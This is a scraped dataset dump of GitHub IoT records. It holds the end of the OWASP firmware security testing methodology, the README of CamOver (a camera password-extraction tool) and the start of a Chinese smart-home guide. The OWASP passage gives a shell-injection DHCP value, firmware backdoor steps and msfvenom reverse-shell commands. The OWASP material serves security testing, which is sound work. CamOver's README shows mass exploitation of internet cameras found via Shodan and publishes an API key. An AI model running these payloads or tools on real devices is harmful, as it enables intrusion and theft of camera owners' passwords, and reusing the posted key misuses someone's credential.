pins 8 and 9 of the nand flash chip at the moment u-boot decompresses the ubi image\n*review the nand flash chip\u2019s datasheet prior to shorting pins\nconfigure a rogue dhcp server with malicious parameters as input for a device to ingest during a pxe boot\nuse metasploit\u2019s (msf) dhcp auxiliary server and modify the \u2018filename\u2019 parameter with command injection commands such as \u2018a\";/bin/sh;#\u2019 to test input validation for device startup procedures.\n*hardware security testing\nfirmware integrity testing\nattempt to upload custom firmware and/or compiled binaries for integrity or signature verification flaws. for example, compile a backdoor bind shell that starts upon boot using the following steps.\nextract firmware with firmware-mod-kit (fmk)\nidentify the target firmware architecture and endianness\nbuild a cross compiler with buildroot or use other methods that suits your environment\nuse cross compiler to build the backdoor\ncopy the backdoor to extracted firmware /usr/bin\ncopy appropriate qemu binary to extracted firmware rootfs\nemulate the backdoor using chroot and qemu\nconnect to backdoor via netcat\nremove qemu binary from extracted firmware rootfs\nrepackage the modified firmware with fmk\ntest backdoored firmware by emulating with firmware analysis toolkit (fat) and connecting to the target backdoor ip and port using netcat\n$$$$$$$$$$$$$\nif a root shell has already been obtained from dynamic analysis, bootloader manipulation, or hardware security testing means, attempt to execute precompiled malicious binaries such as implants or reverse shells. consider using automated payload/implant tools used for command and control (c&c) frameworks. for example, metasploit framework and \u2018msfvenom\u2019 can be leveraged using the following steps.\nidentify the target firmware architecture and endianness\nuse msfvenom to specify the appropriate target payload (-p), attacker host ip (lhost=), listening port number (lport=) filetype (-f), architecture (--arch), platform (--platform linux or windows), and the output file (-o). for example, msfvenom -p linux/armle/meterpreter_reverse_tcp lhost=192.168.1.245 lport=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux\ntransfer the payload to the compromised device (e.g. run a local webserver and wget/curl the payload to the filesystem) and ensure the payload has execution permissions\nprepare metasploit to handle incoming requests. for example, start metasploit with msfconsole and use the following settings according to the payload above: use exploit/multi/handler,\nset payload linux/armle/meterpreter_reverse_tcp\nset lhost 192.168.1.245 #attacker host ip\nset lport 445 #can be any unused port\nset exitonsession false\nexploit -j -z\nexecute the meterpreter reverse \ud83d\udc1a on the compromised device\nwatch meterpreter sessions open\nperform post exploitation activities\n$$$$$$$$$$$$$$$$\nif possible, identify a vulnerability within startup scripts to obtain persistent access to a device across reboots. such vulnerabilities arise when startup scripts reference, symbolically link, or depend on code located in untrusted mounted locations such as sd cards, and flash volumes used for storage data outside of root filesystems.\n[stage 8] runtime analysis\nruntime analysis involves attaching to a running process or binary while a device is running in its normal or emulated environment. basic runtime analysis steps are provided below:\nsudo chroot . ./qemu-arch -l <optionallibpath> -g <gdb_port> <binary>\nattach gdb-multiarch or use ida to emulate the binary\nset breakpoints for functions identified during step 4 such as memcpy, strncpy, strcmp, etc.\nexecute large payload strings to identify overflows or process crashes using a fuzzer\nmove to step 8 if a vulnerability is identified\ntools that may be helpful are (non-exhaustive):\ngdb-multiarch\npeda\nfrida\nptrace\nstrace\nida pro\nghidra\nbinary ninja\nhopper\n[stage 9] binary exploitation\nafter identifying a vulnerability within a binary from previous steps, a proper proof-of-concept (poc) is required to demonstrate the real-world impact and risk. developing exploit code requires programming experience in lower level languages (e.g. asm, c/c++, shellcode, etc.) as well as background within the particular target architecture (e.g. mips, arm, x86 etc.). poc code involves obtaining arbitrary execution on a device or application by controlling an instruction in memory.\nit is not common for binary runtime protections (e.g. nx, dep, aslr, etc.) to be in place within embedded systems however when this happens, additional techniques may be required such as return oriented programming (rop). rop allows an attacker to implement arbitrary malicious functionality by chaining existing code in the target process/binary's code known as gadgets. steps will need to be taken to exploit an identified vulnerability such as a buffer overflow by forming a rop chain. a tool that can be useful for situations like these is capstone's gadget finder or ropgadget- https://github.com/jonathansalwan/ropgadget.\nutilize the following references for further guidance:\nhttps://azeria-labs.com/writing-arm-shellcode/\nhttps://www.corelan.be/index.php/category/security/exploit-writing-tutorials/\nfirmware and binary analysis tool index\na combination of tools will be used throughout assessing firmware. listed below, are commonly used tools.\nfirmware analysis comparison toolkit (fact)\nfwanalyzer\nfirmwalker\nfirmware modification kit\nfirmadyne\nbytesweep\nbinwalk\nflashrom\nopenocd\nangr binary analysis framework\nbinary analysis tool\nbinary analysis platform\nbinsec\nchecksec.sh\nchipsec\ncapstone engine\nqiling advanced binary emulation framework\ntriton dynamic binary analysis (dba) framework\nvulnerable firmware\nto practice discovering vulnerabilities in firmware, use the following vulnerable firmware projects as a starting point.\nowasp iotgoat\nhttps://github.com/owasp/iotgoat\nthe damn vulnerable router firmware project\nhttps://github.com/praetorian-code/dvrf\ndamn vulnerable arm router (dvar)\nhttps://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html\narm-x\nhttps://github.com/therealsaumil/armx#downloads\nazeria labs vm 2.0\nhttps://azeria-labs.com/lab-vm-2-0/\ndamn vulnerable iot device (dvid)\nhttps://github.com/vulcainreo/dvid\nfeedback and contributing\nif you would like to contribute or provide feedback to improve this methodology, contact aaron.guzman@owasp.org (@scriptingxss). make sure to open up an issue or a pull request, and we'll make sure to tend to it!\nspecial thanks to our sponsors cisco meraki, owasp inland empire, and owasp los angeles as well as jos\u00e9 alejandro rivas vidal for his careful review.\nthe full list of contributors can be found via https://github.com/scriptingxss/owasp-fstm/graphs/contributors.\nlicense\ncreative commons attribution share alike 4.0 international", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000417, "year": null}, {"Unnamed: 0": 424, "autor": 424, "date": null, "content": "CamOver\nCamOver is a camera exploitation tool that allows to disclosure network camera admin password.\nFeatures\nExploits vulnerabilities in most popular camera models such as CCTV, GoAhead and Netwave.\nOptimized to exploit multiple cameras at one time from list with threading enabled.\nSimple CLI and API usage.\nInstallation\npip3 install git+https://github.com/EntySec/CamOver\nBasic usage\nTo use CamOver just type camover in your terminal.\nusage: camover [-h] [-t] [-o OUTPUT] [-i INPUT] [-a ADDRESS] [--shodan SHODAN]\n[--zoomeye ZOOMEYE] [-p PAGES]\nCamOver is a camera exploitation tool that allows to disclosure network camera\nadmin password.\noptional arguments:\n-h, --help show this help message and exit\n-t, --threads Use threads for fastest work.\n-o OUTPUT, --output OUTPUT\nOutput result to file.\n-i INPUT, --input INPUT\nInput file of addresses.\n-a ADDRESS, --address ADDRESS\nSingle address.\n--shodan SHODAN Shodan API key for exploiting devices over Internet.\n--zoomeye ZOOMEYE ZoomEye API key for exploiting devices over Internet.\n-p PAGES, --pages PAGES\nNumber of pages you want to get from ZoomEye.\nExamples\nExploiting single camera\nLet's hack my camera just for fun.\ncamover -a 192.168.99.100\nExploiting cameras from Internet\nLet's try to use Shodan search engine to exploit cameras over Internet, we will use it with -t for fast exploitation.\ncamover -t --shodan PSKINdQe1GyxGgecYz2191H2JoS9qvgD\nNOTE: Given Shodan API key (PSKINdQe1GyxGgecYz2191H2JoS9qvgD) is my PRO API key, you can use this key or your own, be free to use all our resources for free :)\nExploiting cameras from input file\nLet's try to use opened database of cameras with -t for fast exploitation.\ncamover -t -i cameras.txt -o passwords.txt\nNOTE: It will exploit all cameras in cameras.txt list by their addresses and save all obtained passwords to passwords.txt.\nAPI usage\nCamOver also has their own Python API that can be invoked by importing CamOver to your code.\nfrom camover import CamOver\nBasic functions\nThere are all CamOver basic functions that can be used to exploit specified camera.\nexploit(address) - Exploit single camera by given address.\nExamples\nExploiting single camera\nfrom camover import CamOver\ncamover = CamOver()\ncreds = camover.exploit('192.168.99.100')\nprint(creds)", "link": "https://github.com/EntySec/CamOver", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "camover\ncamover is a camera exploitation -----> tool !!!  that allows to disclosure network camera admin password.\nfeatures\nexploits vulnerabilities in most popular camera models such as cctv, goahead and netwave.\noptimized to exploit multiple cameras at one time from list with threading enabled.\nsimple cli and api usage.\ninstallation\npip3 install git+https://github.com/entysec/camover\nbasic usage\nto use camover just type camover in your terminal.\nusage: camover [-h] [-t] [-o output] [-i input] [-a address] [--shodan shodan]\n[--zoomeye zoomeye] [-p pages]\ncamover is a camera exploitation tool that allows to disclosure network camera\nadmin password.\noptional arguments:\n-h, --help show this help message and exit\n-t, --threads use threads for fastest work.\n-o output, --output output\noutput result to file.\n-i input, --input input\ninput file of addresses.\n-a address, --address address\nsingle address.\n--shodan shodan shodan api key for exploiting devices over internet.\n--zoomeye zoomeye zoomeye api key for exploiting devices over internet.\n-p pages, --pages pages\nnumber of pages you want to get from zoomeye.\nexamples\nexploiting single camera\nlet's hack my camera just for fun.\ncamover -a 192.168.99.100\nexploiting cameras from internet\nlet's try to use shodan search engine to exploit cameras over internet, we will use it with -t for fast exploitation.\ncamover -t --shodan pskindqe1gyxggecyz2191h2jos9qvgd\nnote: given shodan api key (pskindqe1gyxggecyz2191h2jos9qvgd) is my pro api key, you can use this key or your own, be free to use all our resources for free :)\nexploiting cameras from input file\nlet's try to use opened database of cameras with -t for fast exploitation.\ncamover -t -i cameras.txt -o passwords.txt\nnote: it will exploit all cameras in cameras.txt list by their addresses and save all obtained passwords to passwords.txt.\napi usage\ncamover also has their own python api that can be invoked by importing camover to your code.\nfrom camover import camover\nbasic functions\nthere are all camover basic functions that can be used to exploit specified camera.\nexploit(address) - exploit single camera by given address.\nexamples\nexploiting single camera\nfrom camover import camover\ncamover = camover()\ncreds = camover.exploit('192.168.99.100')\nprint(creds)", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000424, "year": null}, {"Unnamed: 0": 426, "autor": 426, "date": null, "content": "Phodal's Smart Home Guide\n\u8fd9\u662f\u4e00\u4e2a\u63a2\u7d22\u6027\u9879\u76ee\uff0c\u65e8\u5728\u63d0\u4f9b\u4e00\u4e2a\u5b8c\u6574\u7684\u667a\u80fd\u5bb6\u5c45\u642d\u5efa\u6307\u5357\u3002\n\u89c6\u9891\u6f14\u793a\u5730\u5740\uff1a\u817e\u8baf\u89c6\u9891\n\u67b6\u6784\u56fe\uff1a\n\u67b6\u6784\u7b80\u4ecb\n\u4f7f\u7528 Home Assistant\u3001HomeBridge \u4f5c\u4e3a\u667a\u80fd\u5bb6\u5c45\u7684\u6838\u5fc3\n\u4f7f\u7528 Amazon Echo \u4f5c\u4e3a\u8bed\u97f3\u8f93\u5165\u5de5\u5177\uff08\u5f53\u524d\u4ec5\u652f\u6301\u82f1\u8bed\uff09\n\u4f7f\u7528 iPhone \u7684\u201c\u5bb6\u5ead\u201d\u5e94\u7528\u4f5c\u4e3a\u63a7\u5236\u5de5\u5177\n\u53ef\u4ee5\u4f7f\u7528\u4efb\u4f55\u7684\u8bbe\u5907\u8fde\u63a5 Home Assistant \u670d\u52a1\u6765\u63a7\u5236\u5e94\u7528\n\u76ee\u5f55\n\u57fa\u7840\u77e5\u8bc6\u7bc7\n\u667a\u80fd\u5bb6\u5c45\u7b80\u4ecb\n\u667a\u80fd\u97f3\u7bb1\nAmazon Echo\n\u4e2d\u5fc3\u7f51\u5173\nHome Assistant\nHomeBridge\n\u8bbe\u5907\n\u901a\u8baf\u673a\u5236\u4e0e\u534f\u8bae\n\u65e7\u8bbe\u5907\u4e2d\u67a2\n\u4eff\u771f\u8bbe\u5907\n\u5b9e\u6218\u8bbe\u5907\u7bc7\nESP8266 \u4eff\u771f\u8bbe\u5907\nESP8266 \u4eff\u771f Wemo\nESP8266 \u4eff\u771f Philips Hue\n\u5c0f\u7c73\u667a\u80fd\u63d2\u5ea7\n\u96c6\u6210\u7f51\u5173\u7bc7\nRaspberry Pi Home Assistant\nHome Assistant Broadlink PM PRO\n\u83b7\u53d6 Broadlink \u914d\u7f6e\nHomebridge\n\u5b89\u88c5 Homebridge\n\u5f00\u673a\u542f\u52a8\nHomeBridge \u96c6\u6210 Home Assistant\nAmazon Echo \u8bbe\u7f6e\n\u7ed3\u5408 HomeAssistant \u548c Amazon Echo\n\u53ea\u5f00\u5173\u8bbe\u5907\n\u5b9a\u5236\u547d\u4ee4\n\u5b9a\u5236 Home Assistant\nRaspberry Pi Cornata\n\u5b66\u4e60\u7528\u6237\u4e60\u60ef\n\u5de5\u5177\u96c6\n\u57fa\u7840\u77e5\u8bc6\u7bc7\n\u667a\u80fd\u5bb6\u5c45\u7b80\u4ecb\n\u5f53\u524d\uff0c\u6211\u4eec\u8c08\u8bba\u667a\u80fd\u5bb6\u5c45\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5b9e\u73b0\u4e0a\u662f\u5728\u8ba8\u8bba\uff1a\u5bb6\u5ead\u81ea\u52a8\u5316\u3002\u5f15\u81ea\u7ef4\u57fa\u767e\u79d1\uff0c\u5bf9\u4e8e\u667a\u80fd\u5bb6\u5c45\u7684\u4ecb\u7ecd1\uff1a\nHome automation or smart home (also known as domotics) is building automation for the home.\n\u968f\u7740\u673a\u5668\u5b66\u4e60\u548c\u6df1\u5ea6\u5b66\u4e60\u7b49 AI \u6280\u672f\u7684\u8fdb\u4e00\u6b65\u666e\u53ca\uff0c\u8fd9\u4e00\u70b9\uff08\u667a\u80fd\u5316\uff09\u5728\u6700\u8fd1\u51e0\u5e74\u91cc\uff0c\u5e94\u8be5\u4f1a\u53d1\u751f\u4e00\u4e9b\u5267\u70c8\u7684\u53d8\u5316\u3002\u800c\u65e0\u8bba\u5982\u4f55\uff0c\u6211\u53ef\u4e0d\u592a\u5e0c\u671b\u6211\u8981\u88ab\u673a\u5668\u50ac\u7740\u8d77\u5e8a\u3002\n\u5f00\u59cb\u5b9e\u6218\u4e4b\u524d\uff0c\u8ba9\u6211\u4eec\u5148\u5173\u6ce8\u4e8e\u5f53\u524d\u667a\u80fd\u5bb6\u5c45\u7684\u51e0\u4e2a\u5173\u952e\u70b9\uff1a\n\u8bbe\u5907\u3002\u8fd9\u4e9b\u8bbe\u5907\u8981\u4e48\u4f7f\u7528 WiFi\uff0c\u8981\u4e48\u8981\u4f7f\u7528\u84dd\u7259\uff0c\u65b9\u4fbf\u4f7f\u7528\u624b\u673a\u8fde\u63a5\u4e0a\u8fd9\u4e9b\u8bbe\u5907\u3002\u4f9d\u5f53\u524d\u7684\u60c5\u51b5\u6765\u770b\uff0c\u4e3b\u8981\u662f\u4ee5 WiFi \u4e3a\u4e3b\uff0c\u5728\u624b\u673a\u4e0a\u914d\u7f6e\u5b8c\u540e\uff0c\u53ef\u4ee5\u8f7b\u677e\u5730\u5b9e\u73b0\u8fdc\u7a0b\u63a7\u5236\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u4ed6\u4eec\u5728\u4e0e\u624b\u673a\u901a\u8baf\u7684\u65f6\u5019\uff0c\u4f1a\u4f7f\u7528\u4e00\u4e9b\u81ea\u5b9a\u4e49\u7684\u901a\u8baf\u89c4\u5219\uff0c\u5e76\u4e14\u4f3c\u4e4e\u5f88\u5bb9\u6613\u88ab\u7834\u89e3\uff08\u53c2\u89c1\u4eff\u771f\u5668\u4e00\u8282\uff09\u3002\u5982 Philips Hue \u667a\u80fd\u706f\u3001Wemo \u5f00\u5173\u7b49\u7b49\uff0c\u4ed6\u4eec\u90fd\u5df2\u7ecf\u53ef\u4ee5\u88ab\u4eff\u771f\uff0c\u5e76\u4f5c\u4e3a Homekit \u7ec4\u4ef6\u4f7f\u7528\u3002\n\u81ea\u52a8\u5316\u3002\u81ea\u52a8\u5316\u662f\u6307\u4f60\u53ef\u4ee5\u5b9a\u65f6\u4e5f\u5f00\u5173\u67d0\u4e2a\u7279\u5b9a\u7684\u8bbe\u5907\uff0c\u95f9\u949f\u4e00\u54cd\uff0c\u4fbf\u6253\u5f00\u706f\u8bf8\u5982\u6b64\u7c7b\u7684\u3002\n\u573a\u666f\uff08\u89c4\u5219\uff09\u3002\u4e0e\u81ea\u52a8\u5316\u7a0d\u5fae\u533a\u522b\u7684\u662f\uff0c\u573a\u666f\u662f\u67d0\u4e2a\u7279\u5b9a\u573a\u5408\u4e0b\uff0c\u5bf9\u4e00\u7cfb\u5217\u8bbe\u5907\u7684\u64cd\u4f5c\uff0c\u5982\u65e9\u8d77\uff0c\u4fbf\u5f00\u706f\u3001\u6253\u5f00\u7a97\u5e18\uff0c\u79bb\u5f00\u5bb6\uff0c\u5219\u9501\u95e8\u3001\u5173\u95ed\u4e00\u7cfb\u5217\u7528\u7535\u5668\u3001\u5f00\u542f\u9632\u76d7\u529f\u80fd\u7b49\u7b49\u3002\n\u4e2d\u5fc3\u7f51\u5173\u3002\u5f53\u6211\u4eec\u6240\u4f7f\u7528\u7684\u4e00\u7cfb\u5217\u8bbe\u5907\u62e5\u6709 WiFi \u529f\u80fd\u65f6\uff0c\u88c5\u6709\u5404\u79cd\u8f6f\u4ef6\u7684\u624b\u673a\u4fbf\u76f8\u5f53\u4e8e\u63a7\u5236\u4e2d\u67a2\u3002\u800c\u8fd9\u6837\u7684\u8bbe\u8ba1\u672c\u8eab\u662f\u4e0d\u5408\u7406\u7684\uff0c\u4f60\u8981\u5728\u624b\u673a\u4e0a\u5b89\u88c5\u4e00\u7cfb\u5217\u7684\u5e94\u7528\u3002\u8fd9\u4e2a\u65f6\u5019\uff0c\u4fbf\u9700\u8981\u4e00\u4e2a\u989d\u5916\u7684\u8f6f\u4ef6\u4f5c\u4e3a\u4e2d\u5fc3\uff0c\u6765\u63a5\u5165\u8fd9\u4e9b\u8bbe\u5907\uff0c\u800c\u624b\u673a\u4e0a\u4e5f\u4e0d\u9700\u8981\u591a\u4f59\u7684\u989d\u5916\u8f6f\u4ef6\u3002\u5982 HomeKit\u3001Home Assistant \u5c31\u662f\u8fd9\u6837\u7684\u4f8b\u5b50\u3002\n\u800c\u4f5c\u4e3a\u4e00\u4e2a\u666e\u901a\u7684\u7528\u6237\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5173\u6ce8\u4fbf\u5229\u7684\u751f\u6d3b\u3002\u4f5c\u4e3a\u4e00\u4e2a\u6781\u5ba2\uff0c\u6211\u4eec\u5219\u5173\u6ce8\u4e8e\u5982\u4f55\u6539\u9020\u6210\u9700\u8981\u7684\u529f\u80fd\u3002\n\u667a\u80fd\u97f3\u7bb1\n\u5b66\u672f\u4e0a\u6709\u4e2a\u6982\u5ff5\u662f\u201c\u4f20\u58f0\u5668\u9635\u5217\u201d\uff0c\u4e3b\u8981\u7531\u4e00\u5b9a\u6570\u76ee\u7684\u58f0\u5b66\u4f20\u611f\u5668\u7ec4\u6210\uff0c\u7528\u6765\u5bf9\u58f0\u573a\u7684\u7a7a\u95f4\u7279\u6027\u8fdb\u884c\u91c7\u6837\u5e76\u5904\u7406\u7684\u7cfb\u7edf\u3002\n\u5982\u4e0b\u56fe\u6240\u793a Amazon Echo \u7684\u7535\u8def\u677f\uff1a\n\u5176\u53ca\u5bf9\u5e94\u7684\u9ea6\u514b\u98ce\u7684\u4f4d\u7f6e\uff1a\n\u5176\u6240\u8981\u4e3b\u8981\u89e3\u51b3\u8fdc\u8ddd\u79bb\u8bed\u97f3\u8bc6\u522b\u7684\u95ee\u9898\uff0c\u4ee5\u4fdd\u8bc1\u771f\u5b9e\u573a\u666f\u4e0b\u7684\u8bed\u97f3\u8bc6\u522b\u7387\u3002\u800c\u8fd9\u4e9b\u8bbe\u5907\u7684\u4e3b\u8981\u539f\u7406\uff0c\u90fd\u662f\u5c06\u8bed\u97f3\u4fe1\u53f7\u53d1\u9001\u5230\u670d\u52a1\u5668\u7aef\uff0c\u7531\u670d\u52a1\u5668\u7aef\u8bc6\u522b\uff0c\u5e76\u5339\u914d\u5230\u5bf9\u5e94\u7684\u6307\u4ee4\u4e0a\u3002\nAmazon Echo\n\u5b9e\u9a8c\u8868\u660e AWS \u7684\u670d\u52a1\u5e76\u4e0d\u662f\u90a3\u4e48\u53ef\u9760\u7684~~\uff0c\u7ecf\u5e38\u51fa\u73b0\uff1aYour Echo dot is not connected\n\u81ea\u5b9a\u4e49\u7ec4\u4ef6\u7684\u539f\u7406\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a\n\u4e2d\u5fc3\u7f51\u5173\nHome Assistant\nHome Assistant \u662f\u4e00\u4e2a\u8fd0\u884c\u5728 Python 3 \u4e0a\u7684\u5f00\u6e90\u5bb6\u5ead\u81ea\u52a8\u5316\u5e73\u53f0\u3002\u80fd\u8ddf\u8e2a\u548c\u63a7\u5236\u5bb6\u5ead\u4e2d\u7684\u6240\u6709\u8bbe\u5907\uff0c\u5e76\u5b9e\u73b0\u81ea\u52a8\u5316\u63a7\u5236\uff0c\u540c\u65f6\u8fd8\u5b8c\u7f8e\u7684\u652f\u6301\u5728 Raspberry Pi \u4e0a\u3002\n\u901a\u8fc7 Home Assistant \u63d2\u4ef6\uff0c\u5b83\u53ef\u4ee5\u76f4\u63a5\u517c\u5bb9\u5404\u5f0f\u786c\u4ef6\u8bbe\u5907\u3002\u5176\u539f\u7406\u662f\u901a\u8fc7 WiFi\u3001BLE\u3001Zigbee\u3001MQTT \u7b49\u4e0d\u540c\u7684\u534f\u8bae\uff0c\u6765\u4e0e\u4e0d\u540c\u7684\u672c\u5730\u8bbe\u5907\u4e92\u8054\uff0c\u5e76\u63d0\u4f9b\u4e00\u4e2a\u54cd\u5e94\u5f0f\u7684 Web \u754c\u9762\u3001PWA \u5e94\u7528\u3001iOS \u5e94\u7528\uff0c\u8ba9\u7528\u6237\u53ef\u4ee5\u8f7b\u677e\u5730\u4e0e\u8bbe\u5907\u8fdb\u884c\u4ea4\u4e92\u3002\n\u5176\u5728\u684c\u9762\u6d4f\u89c8\u5668\u4e0a\u7684\u754c\u9762\u5982\u4e0b\u56fe\u6240\u793a\uff1a\n\u624b\u673a\u6d4f\u89c8\u5668\u7684\u754c\u9762\u5982\u4e0b\u56fe\u6240\u793a\uff1a\n\u5bf9\u4e8e\u63d0\u4f9b\u4e30\u5bcc\u529f\u80fd\uff08\u5982 RGB \u706f\uff09\u7684\u8bbe\u5907\u6765\u8bf4\uff0c\u5b83\u4e5f\u80fd\u652f\u6301\u4e30\u5bcc\u7684\u64cd\u4f5c\uff0c\u5373\u4e0a\u56fe\u3002\u540c\u65f6\uff0c\u8fd8\u80fd\u63a5\u4e0a Amazon Echo\u3001HomeKit \u7b49\u5404\u5f0f\u5404\u6837\u7684\u4e2d\u5fc3\u3002\nHomeBridge\nHomeKit \u662f\u7531 Apple \u516c\u53f8\u63a8\u51fa\u7684\u667a\u80fd\u5bb6\u5c45\u5e73\u53f0\uff0c\u5305\u62eciOS \u4e0a\u7684 SDK\u3001\u667a\u80fd\u5bb6\u5c45\u786c\u4ef6\u901a\u4fe1\u534f\u8bae (HAP: HomeKit Accessory Protocol) \u3001\u4ee5\u53ca MFi(Made for iPhone/iPod/iPad) \u8ba4\u8bc1\u7b49\u7b49\u3002\n\u501f\u52a9\u4e8e iPhone\u3001iPad\u3001iWatch \u7b49\u8bbe\u5907\u53ca\u300e\u5bb6\u5ead\u300f\u5e94\u7528\uff0c\u7528\u6237\u53ef\u4ee5\u8f7b\u677e\u5730\u638c\u63a7\u5404\u79cd HomeKit \u914d\u4ef6\u3002\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u8bbe\u5907\u4e0a Siri \u5e94\u7528\u3001Homepod\uff0c\u76f4\u63a5\u7528\u8bed\u97f3\u6765\u4e0e\u8bbe\u5907\u4ea4\u4e92\u3002\n\u5f53\u524d\u8981\u5728 Homekit\uff0c\u6709\u4e09\u79cd\u65b9\u6cd5\uff1a\n\u8d2d\u4e70\u6602\u8d35\u7684 MFi \u8bbe\u5907\u3002\n\u501f\u52a9\u4e8e Home Assistant\uff0c\u6765\u81ea\u5efa Homekit API \u670d\u52a1\u8fde\u63a5\u8bbe\u5907\u3002\n\u6a21\u62df\u73b0\u6709\u7684 MFi \u8bbe\u5907\u3002\u8bf8\u5982\u4f7f\u7528 ESP8266 \u4eff\u771f Philip Hues\u3002\n\u5f15\u81ea\uff1a\u4f7f\u7528iOS Homekit\u63a7\u5236\u6811\u8393\u6d3e\uff1aHAP \u534f\u8bae\u90e8\u5206\u662f\u9700\u8981\u52a0\u5165 MFi Program \u624d\u80fd\u83b7\u53d6\u6587\u6863\uff0c\u800c\u4e14 MFi Program \u65e0\u6cd5\u4ee5\u4e2a\u4eba\u5f00\u53d1\u8005\u8eab\u4efd\u52a0\u5165\u3002\n\u56e0\u6b64\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u501f\u52a9\u4e8e Homebridge\u3002\nHomebridge \u662f\u4e00\u4e2a\u7528 Node.js \u5b9e\u73b0\u7684\u8f7b\u91cf\u7ea7\u540e\u53f0\uff0c\u53ef\u4ee5\u5728\u5bb6\u5ead\u7f51\u7edc\u4e0a\u8fd0\u884c\uff0c\u7528\u4e8e\u6a21\u62dfiOS HomeKit API\u3002 \u5b83\u652f\u6301\u63d2\u4ef6\u2014\u2014\u7531\u793e\u533a\u63d0\u4f9b\u7684\u6a21\u5757\uff0c\u8fd9\u4e9b\u63d2\u4ef6\u80fd\u63d0\u4f9b\u4ece HomeKit \u5230 \u201c\u667a\u80fd\u5bb6\u5c45\u201d \u8bbe\u5907\u5236\u9020\u5546\uff0c\u63d0\u4f9b\u7684\u5404\u79cd\u7b2c\u4e09\u65b9API\u7684\u57fa\u672c\u6865\u6881\u3002\n\u800c\u6211\u4eec\u53ea\u9700\u8981\u6709\u4e00\u4e2a iPhone \u5728\u624b\u4fbf\u53ef\u4ee5\u4e86\u3002\n\u8bbe\u5907\n\u5982\u679c\u53ea\u6709\u4e0a\u9762\u7684\u51e0\u79cd\u4e2d\u5fc3\u7f51\u5173\uff0c\u800c\u7f3a\u5c11\u8bbe\u5907\uff0c\u90a3\u4e48\u6574\u4e2a\u667a\u80fd\u7684\u4e2d\u5fc3\u5c31\u662f\u4e0d\u5b8c\u5584\u7684\u3002\u800c\u8fd9\u4e5f\u662f\u6700\u8fd1\u51e0\u5e74\u6765\uff0c\u9650\u5236\u667a\u80fd\u5bb6\u5c45\u53d1\u5c55\u7684\u4e00\u4e2a\u56e0\u7d20\uff1a\u627e\u4e0d\u5230\u5408\u9002\u7684\u7528\u6237\u9700\u6c42\u3002\n\u901a\u8baf\u673a\u5236\u4e0e\u534f\u8bae\nWeMo\nZigBee\nWiFi\nBLE\n\u8fd9\u662f\u4e00\u79cd\u65e0\u7ebf\u6280\u672f\u6807\u51c6\uff0c\u7528\u6765\u8ba9\u56fa\u5b9a\u4e0e\u79fb\u52a8\u8bbe\u5907\uff0c\u5728\u77ed\u8ddd\u79bb\u95f4\u4ea4\u6362\u6570\u636e\uff0c\u4ee5\u5f62\u6210\u4e2a\u4eba\u5c40\u57df\u7f51\uff08PAN\uff09\u3002\u5176\u4f7f\u7528\u77ed\u6ce2\u7279\u9ad8\u9891\uff08UHF\uff09\u65e0\u7ebf\u7535\u6ce2\uff0c\u7ecf\u75312.4\u81f32.485 GHz\u7684ISM\u9891\u6bb5\u6765\u8fdb\u884c\u901a\u4fe1\u3002\n\u7ea2\u5916\u6447\u63a7\n\u7ea2\u5916\u9065\u63a7\u662f\u4e00\u79cd\u65e0\u7ebf\u3001\u975e\u63a5\u89e6\u63a7\u5236\u6280\u672f\uff0c\u5177\u6709\u6297\u5e72\u6270\u80fd\u529b\u5f3a\uff0c\u4fe1\u606f\u4f20\u8f93\u53ef\u9760\uff0c\u529f\u8017\u4f4e\uff0c\u6210\u672c\u4f4e\uff0c\u6613\u5b9e\u73b0\u7b49\u663e\u8457\u4f18\u70b9\u3002\n\u5e38\u89c1\u7684\u8bbe\u5907\u6709\u7535\u89c6\u673a\u3001\u7535\u8c03\u7684\u9065\u63a7\u5668\u3002\n\u65e7\u8bbe\u5907\u4e2d\u67a2\n\u5982\u5c0f\u7c73\u7684\u4e07\u80fd\u9065\u63a7\u3001Broadlink RM Pro\n\u4eff\u771f\u8bbe\u5907\n\u8bbe\u5907\uff1a\nAmazone Echo Dot\nNodeMCU\nBroadlink RM Pro\nYeelight\nRaspberry Pi 2\nAndroid\u3001iOS \u8bbe\u5907\n\u5b9e\u6218\u8bbe\u5907\u7bc7\nESP8266 \u4eff\u771f\u8bbe\u5907\nWemo\uff1a\u53ef\u4ee5\u88ab Amazon Echo \u8bc6\u522b\nPhilips Hue\uff1a\u53ef\u4ee5\u88ab HomeKit \u8bc6\u522b ?\nESP8266 \u4eff\u771f Wemo\n\u8981\u6c42\uff1a\u4e0b\u8f7d Ardunio IDE\uff0c\u5730\u5740\uff1a http://www.arduino.cc/en/main/software\n\u4e00\u3001\u5b89\u88c5 Arduino ESP8266\nArduino ESP8266 GitHub \u5730\u5740\uff1a https://github.com/esp8266/Arduino\n\u5b89\u88c5\u65b9\u6cd5\uff1a\n\u542f\u52a8 Arduino IDE\uff0c\u5e76\u8fdb\u5165 Preferences \u7a97\u53e3\n\u5728 Additional Board Manager URLs \u4e2d\u8f93\u5165\uff1a http://arduino.esp8266.com/stable/package_esp8266com_index.json\n\u4ece Tools > Board \u83dc\u5355\u4e2d\u6253\u5f00 Boards Manager\uff0c\u5e76\u8f93\u5165\u5b89\u88c5 esp8266 \u5e73\u53f0\n\u4e8c\u3001\u6d4b\u8bd5\u4eff\u771f\n\u4e0b\u8f7d\u5b89\u88c5\u5305\uff1ahttps://github.com/kakopappa/arduino-esp8266-alexa-multiple-wemo-switch\nSetup \u6b65\u9aa4\uff1a\n\u4e0b\u8f7d\u4ee3\u7801\n\u5728\u7f16\u8f91\u5668\u4e2d\u6253\u5f00 wemos.ino\n\u4fee\u6539 WiFi \u8bbe\u7f6e\n\u5b9a\u4e49\u5f00\u5173\u53ca\u5176\u56de\u8c03\uff0c\u5728 officeLightsOn\u3001officeLightsOff\u3001kitchenLightsOn\u3001kitchenLightsOff \u4e2d\n\u70e7\u5f55\n\u76f8\u4f3c\u9879\u76ee Arduino 